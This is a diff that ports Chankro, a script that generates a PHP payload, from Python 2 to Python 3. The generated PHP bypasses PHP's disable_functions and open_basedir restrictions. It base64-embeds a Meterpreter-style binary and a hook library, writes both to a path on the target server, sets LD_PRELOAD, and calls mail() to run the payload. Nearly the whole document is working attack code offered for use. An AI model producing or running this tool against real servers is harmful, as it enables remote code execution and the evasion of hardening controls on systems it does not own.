@@ -1,10 +1,10 @@
-######## Chankro v0.4 #######
-
+######## Chankro v0.5 #######
+# This edition will works on python3
 # [+] Bypass disable_functions
 # [+] Bypass open_basedir
 
 ##############################
-#          @TheXC3LL         #
+#          @Ash-127-0-0-1         #
 ##############################
 
 
@@ -22,20 +22,20 @@ args = parser.parse_args()
 # path where the tool is installed
 script_path = os.path.dirname(os.path.realpath(__file__))
 
-print "\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n"
+print ("\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n")
 
 
 if not args.meter:
-	print "[!] Error: please select a valid file as input"
- 	exit()
+	print ("[!] Error: please select a valid file as input")
+	exit()
 try:
 	with open(args.meter, "rb") as file:
 		encoded_shell = base64.b64encode(file.read())
 except:
-	print "[!] Error: file could not be opened"
+	print ("[!] Error: file could not be opened")
 	exit()
 if not args.out:
-	print "[!] Error: please select a valid file as output"
+	print ("[!] Error: please select a valid file as output")
 	exit()
 try:
         if (os.path.isabs(args.out)):
@@ -43,39 +43,41 @@ try:
         else:
                 outfile = open(os.getcwd() + '/' + args.out, "w") # relative path provided
 except:
-	print "[!] Error: file could not be created"
+	print ("[!] Error: file could not be created")
 	exit()
 
 if not args.arch:
-	print "[!] Error: select architecture (64 or 32)"
+	print ("[!] Error: select architecture (64 or 32)")
 	exit()
 else:
 	if args.arch != "32" and args.arch != "64":
-		print "[!] Error: unknow architecture"
+		print ("[!] Error: unknow architecture")
 		exit()
 	else:
 		archi = script_path + "/hook" + args.arch + ".so"
 if not args.pati:
-	print "[!] Error: remote path"
+	print ("[!] Error: remote path")
 	exit()
 
 with open(archi, "rb") as bicho:
 	encoded_bicho = base64.b64encode(bicho.read())
 
 
-head = "<?php\n $hook = '" + encoded_bicho  + "';\n"
-body1 = "$meterpreter = '" + encoded_shell + "';\n"
+
+
+head = "<?php\n $hook = '" + encoded_bicho.decode() + "';\n"
+body1 = "$meterpreter = '" + encoded_shell.decode() + "';\n"
 body2 = "file_put_contents('" + args.pati + "/chankro.so', base64_decode($hook));\n"
 body3 = "file_put_contents('" + args.pati + "/acpid.socket', base64_decode($meterpreter));\n"
 cosa3 = "putenv('CHANKRO=" + args.pati + "/acpid.socket');\n"
 tail1 = "putenv('LD_PRELOAD=" + args.pati + "/chankro.so');\n"
 tail2 = "mail('a','a','a','a');?>"
 
-print "[+] Binary file: " + args.meter
-print "[+] Architecture: x" + args.arch
-print "[+] Final PHP: " + args.out + "\n\n"
+print ("[+] Binary file: " + args.meter)
+print ("[+] Architecture: x" + args.arch)
+print ("[+] Final PHP: " + args.out + "\n\n")
 
 
 outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2)
 outfile.close()
-print "[+] File created!"
+print ("[+] File created!")
